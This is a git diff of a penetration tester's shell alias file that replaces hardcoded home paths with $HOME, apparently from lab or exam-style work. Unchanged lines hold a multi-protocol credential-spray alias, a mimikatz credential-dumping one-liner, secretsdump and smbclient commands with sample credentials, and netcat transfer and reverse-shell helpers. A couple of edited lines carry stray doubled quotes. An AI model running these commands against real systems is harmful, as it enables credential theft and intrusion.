@@ -12,37 +12,37 @@ export USERNAME=""
 export PASSWORD=""
 
 #smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer
-alias credspray='(){/home/kali/Tools/scripts/CredSpray.py "$@"}'
+alias credspray='(){"$HOME"/Tools/scripts/CredSpray.py "$@"}'
 #smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer 
 #impacket-secretsdump -just-dc-user brad relia.com/andrea:"PasswordPassword_6"@172.16.120.6
-alias addu='(){printf "$1" >> /home/kali/Tools/db/users.txt}'
-alias addo='(){printf "$1" >> /home/kali/Tools/db/passwords.txt}'
-alias addc='(){printf "$1" >> /home/kali/Tools/db/creds.txt}'
-alias addh='(){printf "$1" >> /home/kali/Tools/db/hashes.txt}'
-alias users='cat /home/kali/Tools/db/users.txt'
-alias passwords='cat /home/kali/Tools/db/passwords.txt'
-alias creds='cat /home/kali/Tools/db/creds.txt'
-alias hashes='cat /home/kali/Tools/db/hashes.txt'
+alias addu='(){printf "$1" >> "$HOME"/Tools/db/users.txt}'
+alias addo='(){printf "$1" >> "$HOME"/Tools/db/passwords.txt}'
+alias addc='(){printf "$1" >> "$HOME"/Tools/db/creds.txt}'
+alias addh='(){printf "$1" >> "$HOME"/Tools/db/hashes.txt}'
+alias users='cat "$HOME"/Tools/db/users.txt'
+alias passwords='cat "$HOME"/Tools/db/passwords.txt'
+alias creds='cat "$HOME"/Tools/db/creds.txt'
+alias hashes='cat "$HOME"/Tools/db/hashes.txt'
 alias nxc_spray='nxc smb "$1" -u "$2" -p "$3" | tee -a smb.AD.txt ; nxc smb "$1" -u "$2" -p "$3" --local-auth | tee -a smb.local.txt ; nxc wmi "$1" -u "$2" -p "$3" | tee -a wmi.AD.txt ; nxc wmi "$1" -u "$2" -p "$3" --local-auth | tee -a wmi.local.txt ; nxc rdp "$1" -u "$2" -p "$3" | tee -a rdp.AD.txt ; nxc rdp "$1" -u "$2" -p "$3" --local-auth | tee -a rdp.local.txt; nxc ftp "$1" -u "$2" -p "$3" | tee -a ftp.AD.txt ; nxc ftp "$1" -u "$2" -p "$3" --local-auth | tee -a ftp.local.txt ; nxc winrm "$1" -u "$2" -p "$3" | tee -a winrm.AD.txt ; nxc winrm "$1" -u "$2" -p "$3" --local-auth | tee -a winrm.local.txt ; nxc mssql "$1" -u "$2" -p "$3" | tee -a mssql.AD.txt ; nxc mssql "$1" -u "$2" -p "$3" --local-auth | tee -a mssql.local.txt ; nxc ldap "$1" -u "$2" -p "$3" | tee -a ldap.AD.txt ; nxc ldap "$1" -u "$2" -p "$3" --local-auth | tee -a ldap.local.txt ;'
 alias mimikatz_oneliner='echo ".\mimikatz.exe "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump:sam" "lsadump::cache" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "lsadump::secrets" "sekurlsa::tickets" "sekurlsa::tickets /export" "sekurlsa::msv" "sekurlsa::credman" "vault::cred " "vault::cred /patch" "lsadump::secrets" "exit""'
 alias se='(){searchsploit "$@"}'
-alias toolbox='cd /home/kali/Tools/binaries/ToolBox'
+alias toolbox='cd "$HOME"/Tools/binaries/ToolBox'
 alias cloud_transfe="echo scp -i ~/.ssh/hambone.pem kali@ec2-3-101-154-224.us-west-1.compute.amazonaws.com"
 alias pty="echo python3 -c 'import pty;pty.spawn('/bin/bash')'"
-alias tjp='source /home/kali/.kali'
-alias setrhost='(){/home/kali/setrhost.py "$1" && source /home/kali/.kali}'
-alias setlhost='(){/home/kali/setlhost.py "$1" && source /home/kali/.kali}'
+alias tjp='source "$HOME"/.kali'
+alias setrhost='(){"$HOME"/Tools/scripts/setrhost.py "$1" && source "$HOME"/.kali}'
+alias setlhost='(){"$HOME"/Tools/scripts/setlhost.py "$1" && source ""$HOME"/.kali}'
 alias setvpnhost="export LHOST=`ifconfig | grep tun0 -A 1 | grep inet | cut -b 14-27`"
-alias setrport='(){/home/kali/setrport.py "$1" && source /home/kali/.kali}'
-alias setusername='(){/home/kali/setusername.py "$1" && source /home/kali/.kali}'
-alias setpassword='(){/home/kali/setpassword.py "$1" && source /home/kali/.kali}'
-alias setlport='(){/home/kali/setlport.py "$1" && source /home/kali/.kali}'
+alias setrport='(){"$HOME"/Tools/scripts/setrport.py "$1" && source ""$HOME"/.kali}'
+alias setusername='(){"$HOME"/Tools/scripts/setusername.py "$1" && source "$HOME"/.kali}'
+alias setpassword='(){"$HOME"/Tools/scripts/setpassword.py "$1" && source "$HOME"/.kali}'
+alias setlport='(){"$HOME"/Tools/scripts/setlport.py "$1" && source "$HOME"/.kali}'
 #alias setcwd='hash -d cwd=`pwd`'
-alias setcwd='(){/home/kali/setcwd.py "$1" && source /home/kali/.kali}'
-export cwd="/home/kali/Documents/Relia/loot"
+alias setcwd='(){"$HOME"/Tools/scripts/setcwd.py "$1" && source "$HOME"/.kali}'
+export cwd="/home/kali"
 alias cwd='cd "$cwd"'
-alias s='(){grep -i "$1" /home/kali/.kali --color}'
-alias o='gedit /home/kali/.kali &'
+alias s='(){grep -i "$1" "$HOME"/.kali --color}'
+alias o='gedit "$HOME"/.kali &'
 alias pcwd='echo "$cwd"'
 alias shells='(){ shells.sh $1 ;}'
 #alias gedit='(){gedit "$1" &}'
@@ -71,7 +71,7 @@ alias auto_ldap='(){ldapsearch -h "$1" -p "$2" -x -s base}'
 #### Transfer Files #####
 alias pysrv='python3 -m http.server' #transfer
 alias iwr='(){echo iwr -uri http://"$LHOST":8000/"$1" -Outfile "$1"}' #transfer
-alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/}' #transfer
+alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root "$HOME"/webdav/}' #transfer
 alias wtransfer='(){echo copy-item "$1"\\\\\\"$LHOST"\\share\\"$1"}'
 alias wtransfernc='(){echo "nc.exe "$LHOST" "$LPORT" -w 3 < "$1""}'
 alias wtransfernc_kali='echo nc -lvp "$LPORT" > FiletoDownload'
@@ -195,7 +195,7 @@ alias msfvenom_hsa='echo "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45
 
 
 #### tmux ####
-alias t='(){grep -i tmux /home/kali/.kali --color}'
+alias t='(){grep -i tmux "$HOME"/.kali --color}'
 # tmux prefix = Ctrl + b
 # tmux attach
 # tmux ls
